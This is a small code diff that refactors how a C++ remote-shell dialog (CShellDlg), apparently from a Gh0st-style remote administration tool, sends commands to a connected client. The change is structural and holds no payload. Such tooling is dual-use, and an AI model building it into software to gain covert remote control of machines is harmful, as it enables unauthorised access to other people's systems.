@@ -64,7 +64,7 @@ BOOL CShellDlg::OnInitDialog()
 	SetWindowText(str);
 
 	BYTE bToken = COMMAND_NEXT;
-	m_iocpServer->Send2Client(m_ContextObject, &bToken, sizeof(BYTE));  
+	m_ContextObject->Send2Client(&bToken, sizeof(BYTE));  
 
 	m_Edit.SetWindowTextA(">>");
 	m_nCurSel = m_Edit.GetWindowTextLengthA();
@@ -206,7 +206,7 @@ BOOL CShellDlg::PreTranslateMessage(MSG* pMsg)
 				return TRUE;
 			}
 			int length = str.GetLength() - m_nCurSel;
-			m_iocpServer->Send2Client(m_ContextObject, pSrc, length);
+			m_ContextObject->Send2Client(pSrc, length);
 			m_nCurSel = m_Edit.GetWindowTextLength();
 		}
 		// ÏÞÖÆVK_BACK
